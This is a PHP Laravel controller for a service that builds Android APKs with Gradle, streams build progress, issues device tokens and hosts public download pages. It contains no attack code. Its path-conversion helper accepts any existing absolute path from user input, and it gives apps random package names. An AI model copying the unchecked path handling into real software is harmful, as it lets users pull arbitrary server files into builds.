<?php

namespace App\Http\Controllers;

use App\Exceptions\GradleApkBuilder\GradleApkBuildException;
use App\Exceptions\ResourceAccessDeniedException;
use App\Http\Requests\Build\BuildRequest;
use App\Models\AppBuild;
use App\Models\AppTemplate;
use App\Services\GradleApkBuilder\GradleApkBuildConfig;
use App\Services\GradleApkBuilder\GradleApkBuilder;
use App\Services\DeviceTokenService;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Inertia\Inertia;
use Inertia\Response;
use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * APK 构建控制器。
 *
 * 权限检查由路由中间件 permission:builds.* 统一完成，
 * 控制器内只处理资源归属校验。
 */
class AppBuildController extends Controller
{
    public function index(Request $request): Response
    {
        $builds = AppBuild::where('user_id', $request->user()->getResourceOwnerId())
            ->with('template')
            ->orderBy('created_at', 'desc')
            ->paginate(20);

        $builds->getCollection()->each->append(['download_url', 'icon_url', 'background_url', 'share_url']);

        return Inertia::render('Builds/Index', [
            'builds' => $builds,
        ]);
    }

    /**
     * 公开的 APK 下载页面（无需登录）
     */
    public function download(AppBuild $build): Response
    {
        $build->append(['download_url', 'icon_url']);

        // 获取文件大小
        $fileSize = null;
        if ($build->file_path) {
            // file_path 格式: storage/app/public/apk/...
            $fullPath = str_starts_with($build->file_path, 'storage/app/public/')
                ? storage_path('app/public/' . substr($build->file_path, 19))
                : storage_path($build->file_path);
            
            if (file_exists($fullPath)) {
                $bytes = filesize($fullPath);
                $fileSize = $this->formatFileSize($bytes);
            }
        }

        return Inertia::render('Builds/Download', [
            'build' => $build,
            'fileSize' => $fileSize,
        ]);
    }

    /**
     * 格式化文件大小
     */
    private function formatFileSize(int $bytes): string
    {
        if ($bytes >= 1073741824) {
            return number_format($bytes / 1073741824, 1).' GB';
        } elseif ($bytes >= 1048576) {
            return number_format($bytes / 1048576, 1).' MB';
        } elseif ($bytes >= 1024) {
            return number_format($bytes / 1024, 1).' KB';
        }

        return $bytes.' B';
    }

    public function create(Request $request): Response
    {
        $templates = AppTemplate::where('is_active', true)->get();
        $ownerId = $request->user()->getResourceOwnerId();

        $iconsPath = config('apk-builder.icons_path').'/'.$ownerId;
        $icons = $this->listUserImages($iconsPath, 'icons', $ownerId);

        $bgPath = config('apk-builder.backgrounds_path').'/'.$ownerId;
        $backgrounds = $this->listUserImages($bgPath, 'backgrounds', $ownerId);

        return Inertia::render('Builds/Create', [
            'templates' => $templates,
            'icons' => $icons,
            'backgrounds' => $backgrounds,
        ]);
    }

    public function stream(BuildRequest $request): StreamedResponse
    {
        $validated = $request->validated();
        $owner = $request->user()->getResourceOwner();
        $userId = $owner->id;
        $userEmail = $owner->email;

        $packageName = trim((string) ($validated['package_name'] ?? '')) !== ''
            ? trim((string) $validated['package_name'])
            : $this->generatePackageName();
        $version = trim((string) ($validated['version'] ?? '')) !== ''
            ? trim((string) $validated['version'])
            : $this->generateVersion();

        // 构建 Gradle 配置数组
        $buildConfigData = [
            'app_name' => $validated['name'],
            'websocket_url' => config('apk-builder.defaults.websocket_url'),
            'user_email' => $userEmail,
            'application_id' => $packageName,
            'version_name' => $version,
            'icon_path' => $this->convertUrlToPath($validated['icon_path'] ?? ''),
            'background_path' => $this->convertUrlToPath($validated['background_path'] ?? ''),
            'debug' => $validated['debug'] ?? 1,
            'alert_title' => $validated['alertTitle'] ?? '',
            'alert_msg' => $validated['alertMsg'] ?? '',
            'ok_text' => $validated['okText'] ?? '',
            'main_url' => $validated['mainUrl'] ?? '',
        ];

        // 先建记录获取 build ID，用于生成设备认证 token
        $build = AppBuild::create([
            'user_id' => $userId,
            'template_id' => null,
            'name' => $validated['name'],
            'package_name' => $packageName,
            'version' => $version,
            'websocket_url' => config('apk-builder.defaults.websocket_url'),
            'client_name' => $validated['client_name'] ?? '',
            'icon_path' => $validated['icon_path'] ?? '',
            'background_path' => $validated['background_path'] ?? '',
            'is_custom' => true,
            'build_config' => $buildConfigData,
            'started_at' => now(),
        ]);

        // 生成设备认证 token
        $tokenService = app(DeviceTokenService::class);
        $deviceToken = $tokenService->generateToken($userEmail, $build->id);
        $build->update(['device_token' => $deviceToken]);

        $buildId = $build->id;

        return response()->stream(function () use ($buildConfigData, $build, $buildId) {
            if (ob_get_level()) {
                ob_end_clean();
            }

            set_time_limit(0);
            session_write_close();

            $config = GradleApkBuildConfig::fromArray($buildConfigData);
            $builder = app(GradleApkBuilder::class);

            $builder->onProgress(function ($step, $label, $status) {
                $this->sendSSE([
                    'type' => 'step',
                    'step' => $step,
                    'label' => $label,
                    'status' => $status,
                ]);
            });

            try {
                $result = $builder->build($config);

                $build->update([
                    'file_path' => $result->path,
                    'build_config' => $config->toArray(),
                    'build_stats' => $result->stats,
                    'completed_at' => now(),
                ]);

                $this->sendSSE([
                    'type' => 'complete',
                    'build_id' => $buildId,
                    'path' => $result->path,
                    'duration' => $result->totalTimeMs,
                ]);
            } catch (GradleApkBuildException|\Throwable $e) {
                $build->delete();

                $this->sendSSE([
                    'type' => 'error',
                    'error' => '构建失败: '.$e->getMessage(),
                ]);
            }
        }, 200, [
            'Content-Type' => 'text/event-stream',
            'Cache-Control' => 'no-cache',
            'Connection' => 'keep-alive',
            'X-Accel-Buffering' => 'no',
        ]);
    }

    private function sendSSE(array $data): void
    {
        echo 'data: '.json_encode($data, JSON_UNESCAPED_UNICODE)."\n\n";

        if (connection_aborted()) {
            exit;
        }

        // 确保数据立即发送
        if (ob_get_level()) {
            ob_flush();
        }
        flush();
    }

    /**
     * 发送心跳消息保持连接
     */
    private function sendHeartbeat(): void
    {
        echo ": heartbeat\n\n";

        if (connection_aborted()) {
            exit;
        }

        if (ob_get_level()) {
            ob_flush();
        }
        flush();
    }

    public function show(Request $request, AppBuild $build): Response
    {
        $this->ensureBuildOwnership($build, $request->user());

        $build->load('template');
        $build->append(['download_url', 'build_duration', 'icon_url', 'background_url', 'share_url']);

        return Inertia::render('Builds/Show', [
            'build' => $build,
            'backUrl' => route('builds.index'),
        ]);
    }

    public function destroy(Request $request, AppBuild $build)
    {
        $this->ensureBuildOwnership($build, $request->user());

        $build->delete();

        return redirect()->route('builds.index')
            ->with('success', 'APK 构建已删除');
    }

    /**
     * 确保构建记录归属于当前用户（含子账号共享资源逻辑）。
     *
     * @throws ResourceAccessDeniedException
     */
    private function ensureBuildOwnership(AppBuild $build, mixed $user): void
    {
        if ($build->user_id !== $user->getResourceOwnerId()) {
            throw new ResourceAccessDeniedException;
        }
    }

    private function generatePackageName(): string
    {
        $words = ['app', 'tool', 'util', 'helper', 'service', 'system', 'manager', 'client'];
        $prefix = ['com', 'org', 'net'][array_rand(['com', 'org', 'net'])];
        $middle = $words[array_rand($words)];
        $suffix = strtolower(chr(rand(97, 122))).Str::lower(Str::random(5));

        return "{$prefix}.{$middle}.{$suffix}";
    }

    private function generateVersion(): string
    {
        $major = rand(1, 3);
        $minor = rand(0, 9);
        $patch = rand(0, 9);

        return "{$major}.{$minor}.{$patch}";
    }

    /**
     * 将 URL 路径转换为实际文件路径
     * /storage/icons/1/xxx.png → storage_path('app/public/icons/1/xxx.png')
     */
    private function convertUrlToPath(string $url): string
    {
        if (empty($url)) {
            return '';
        }

        // 如果已经是绝对路径，直接返回
        if (str_starts_with($url, '/') && file_exists($url)) {
            return $url;
        }

        // 转换 /storage/xxx 为 storage_path('app/public/xxx')
        if (str_starts_with($url, '/storage/')) {
            $relativePath = substr($url, strlen('/storage/'));
            return storage_path('app/public/' . $relativePath);
        }

        return $url;
    }

    private function listUserImages(string $path, string $type, int $userId): array
    {
        $images = [];
        if (is_dir($path)) {
            $files = scandir($path);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') {
                    continue;
                }
                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                if (in_array($ext, ['png', 'jpg', 'jpeg'])) {
                    $images[] = [
                        'name' => $file,
                        'url' => '/storage/'.$type.'/'.$userId.'/'.$file,
                    ];
                }
            }
        }

        return $images;
    }
}
